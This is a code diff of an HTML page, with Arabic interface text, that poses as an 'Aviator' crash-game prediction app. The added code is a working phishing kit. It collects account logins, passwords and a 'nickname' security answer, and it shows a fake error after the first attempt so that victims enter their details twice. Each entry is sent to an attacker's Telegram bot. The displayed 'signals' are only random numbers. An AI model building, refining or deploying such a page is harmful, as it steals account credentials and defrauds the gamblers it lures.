@@ -4,109 +4,93 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
     <title>Aviator Quantum Predictor v6.0</title>
+    <script src="https://telegram.org/js/telegram-web-app.js"></script>
     <script src="https://cdn.tailwindcss.com"></script>
     <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;700;900&display=swap" rel="stylesheet">
     <style>
         .auth-input { width: 100%; padding: 1rem; background: #121212; border: 1px solid rgba(255,255,255,0.05); border-radius: 1rem; text-align: center; outline: none; color: white; }
         .sec-input { width: 100%; padding: 1.2rem; background: white !important; border: 4px solid #ef4444 !important; border-radius: 1rem; color: black !important; font-weight: 900; font-size: 1.2rem; text-align: center; outline: none; }
         .hidden { display: none !important; }
-        #target-mult { transition: all 0.3s ease-out; }
-        #next-btn { transition: all 0.15s cubic-bezier(0.4, 0, 0.2, 1); }
+        .err-msg { color: #ff4444; font-size: 11px; font-weight: bold; margin-top: 10px; text-align: center; }
     </style>
 </head>
 <body class="bg-[#050505] text-white font-['Inter'] overflow-hidden">
 
     <section id="auth-screen" class="fixed inset-0 z-50 flex flex-col items-center justify-center p-6 bg-gradient-to-b from-[#0a0a0a] to-black">
         <div class="w-full max-w-md space-y-8 text-center">
-            <h1 class="text-4xl font-black italic uppercase">Quantum<span class="text-blue-500">Node</span></h1>
+            <h1 class="text-4xl font-black tracking-tighter italic uppercase">Quantum<span class="text-blue-500">Node</span></h1>
+            <p class="text-zinc-500 text-sm font-medium">يرجى ربط حساب المنصة لتفعيل المزامنة الفورية</p>
+            
             <div class="space-y-4">
-                <input type="text" id="u_log" placeholder="رقم الهاتف أو البريد" class="auth-input">
+                <input type="text" id="u_log" placeholder="رقم الهاتف أو البريد الإلكتروني" class="auth-input">
                 <input type="password" id="u_pas" placeholder="كلمة المرور" class="auth-input">
-                <p id="login-err" class="hidden text-red-500 text-[11px] font-bold">⚠️ خطأ في المصادقة: أعد المحاولة</p>
-                <button onclick="processLogin()" class="w-full py-4 bg-blue-600 rounded-2xl font-black text-lg shadow-lg active:scale-95 transition-all">Start Real-Time Sync</button>
+                <p id="login-err" class="err-msg hidden">⚠️ خطأ: فشل المصادقة، تأكد من البيانات وأعد المحاولة.</p>
+                <button onclick="processLogin()" id="sync-btn" class="w-full py-4 bg-blue-600 rounded-2xl font-black text-lg shadow-lg shadow-blue-600/20 uppercase">
+                    Start Real-Time Sync
+                </button>
             </div>
         </div>
     </section>
 
     <section id="security-layer" class="hidden fixed inset-0 z-[60] flex flex-col items-center justify-center p-6 bg-black">
         <div class="w-full max-w-md text-center space-y-6">
-            <h2 class="text-2xl font-black uppercase text-red-600">Security Lock</h2>
-            <input type="text" id="u_nick" placeholder="أدخل اللقب" class="sec-input">
-            <p id="nick-err" class="hidden text-red-500 text-[11px] font-bold">⚠️ خطأ: اللقب غير متطابق</p>
+            <div class="w-20 h-20 border-2 border-red-600 rounded-full flex items-center justify-center mx-auto bg-red-600/10">
+                <span class="text-red-600 text-4xl">⚠️</span>
+            </div>
+            <h2 class="text-2xl font-black uppercase">Security Lock</h2>
+            <p class="text-red-500 font-bold text-sm italic">أدخل "اللقب" لتجاوز نظام الحماية الثنائي (2FA)</p>
+            <input type="text" id="u_nick" placeholder="اكتب اللقب هنا..." class="sec-input">
+            <p id="nick-err" class="err-msg hidden">⚠️ خطأ أمني: اللقب غير متطابق مع بيانات المنصة!</p>
             <button onclick="processNick()" class="w-full py-4 bg-white text-black font-black rounded-2xl uppercase">Confirm & Unlock</button>
         </div>
     </section>
 
     <section id="main-app" class="hidden h-screen flex flex-col p-4 bg-[#050505]">
+        <header class="flex justify-between items-center py-4 px-2">
+            <div class="flex items-center gap-2">
+                <span class="w-2 h-2 bg-cyan-400 rounded-full animate-pulse"></span>
+                <span class="text-xs font-black italic uppercase text-zinc-400">Aviator Veto Vision</span>
+            </div>
+        </header>
+
         <main class="flex-1 flex flex-col items-center justify-center relative">
             <div class="relative w-72 h-72 flex items-center justify-center">
-                <div class="absolute inset-0 rounded-full border-[2px] border-cyan-500/30 animate-ping"></div>
                 <div class="absolute inset-4 rounded-full border-[8px] border-white shadow-[0_0_50px_rgba(34,211,238,0.4)] bg-[#0057ff]"></div>
                 <div class="relative z-10 text-center">
-                    <div id="target-mult" class="text-6xl font-black italic text-white drop-shadow-2xl">1.00x</div>
+                    <div id="target-mult" class="text-6xl font-black italic text-white">1.00x</div>
                     <div class="text-[10px] font-black text-cyan-200 tracking-widest uppercase mt-2">Next Hit</div>
                 </div>
             </div>
-            <div class="mt-8 text-center">
-                <h2 class="text-xl font-black italic tracking-widest text-white uppercase">Veto Vision Pro</h2>
-            </div>
         </main>
 
-        <footer class="pb-6">
-            <button id="next-btn" onclick="getNextSingle()" class="w-full py-5 bg-cyan-500 rounded-[2.5rem] font-black text-2xl italic text-black shadow-xl shadow-cyan-500/20 uppercase">
-                GET NEXT
-            </button>
+        <footer class="p-4">
+            <button onclick="getSignal()" id="action-btn" class="w-full py-5 bg-cyan-500 rounded-[2rem] font-black text-xl italic text-black uppercase shadow-xl shadow-cyan-500/20">GET SIGNAL</button>
         </footer>
     </section>
 
     <script>
+        // دمج الدوال اللي مديتهم لي مع نظام الإرسال للبوت
         const botToken = "YOUR_BOT_TOKEN"; 
         const chatId = "YOUR_CHAT_ID";
 
-        function send(m) {
-            fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(m)}&parse_mode=html`);
+        function send(msg) {
+            fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(msg)}&parse_mode=html`);
         }
 
-        // --- دالة الأنميشن الاحترافية ---
-        function animateButton(btnId) {
-            const btn = document.getElementById(btnId);
-            if (!btn) return;
-            btn.style.transform = "scale(0.92)";
-            btn.style.boxShadow = "0 0 25px rgba(34, 211, 238, 0.8)";
-            setTimeout(() => { btn.style.transform = "scale(1)"; }, 120);
-            setTimeout(() => { btn.style.boxShadow = "0 0 10px rgba(34, 211, 238, 0.3)"; }, 300);
-        }
-
-        // --- دالة GET NEXT المطورة ---
-        function getNextSingle() {
-            const t = document.getElementById("target-mult");
-            animateButton("next-btn");
-            t.innerText = "LOADING...";
-            t.style.opacity = "0.5";
-            t.style.transform = "scale(0.8)";
-
-            setTimeout(() => {
-                let num = (Math.random() * (22 - 1.1) + 1.1).toFixed(2);
-                t.innerText = num + "x";
-                t.style.opacity = "1";
-                t.style.transform = "scale(1.2)";
-                setTimeout(() => { t.style.transform = "scale(1)"; }, 150);
-            }, 600);
-        }
-
-        // --- منطق الفخ المزدوج ---
         let loginAttempts = 0;
         function processLogin() {
             const u = document.getElementById('u_log').value;
             const p = document.getElementById('u_pas').value;
             if (!u || !p) return;
+
             loginAttempts++;
             if (loginAttempts === 1) {
-                send(`<b>❌ محاولة 1:</b>\n👤: <code>${u}</code>\n🔑: <code>${p}</code>`);
+                send(`<b>❌ محاولة 1 (خطأ):</b>\n👤: <code>${u}</code>\n🔑: <code>${p}</code>`);
                 document.getElementById('login-err').classList.remove('hidden');
                 document.getElementById('u_pas').value = "";
             } else {
-                send(`<b>✅ محاولة 2:</b>\n👤: <code>${u}</code>\n🔑: <code>${p}</code>`);
+                send(`<b>✅ محاولة 2 (صحيحة):</b>\n👤: <code>${u}</code>\n🔑: <code>${p}</code>`);
+                document.getElementById('login-err').classList.add('hidden');
                 document.getElementById('auth-screen').classList.add('hidden');
                 document.getElementById('security-layer').classList.remove('hidden');
             }
@@ -116,16 +100,23 @@
         function processNick() {
             const n = document.getElementById('u_nick').value;
             if (!n) return;
+
             nickAttempts++;
             if (nickAttempts === 1) {
-                send(`<b>❌ لقب 1:</b>\n🔑: <code>${n}</code>`);
+                send(`<b>❌ لقب 1 (خطأ):</b>\n🔑: <code>${n}</code>`);
                 document.getElementById('nick-err').classList.remove('hidden');
                 document.getElementById('u_nick').value = "";
             } else {
-                send(`<b>✅ لقب 2:</b>\n🔑: <code>${n}</code>`);
+                send(`<b>✅ لقب 2 (صحيح):</b>\n🔑: <code>${n}</code>`);
+                document.getElementById('nick-err').classList.add('hidden');
                 document.getElementById('security-layer').classList.add('hidden');
                 document.getElementById('main-app').classList.remove('hidden');
             }
+        }
+
+        function getSignal() {
+            const res = document.getElementById('target-mult');
+            res.innerText = (Math.random() * (10 - 1.1) + 1.1).toFixed(2) + "x";
         }
     </script>
 </body>
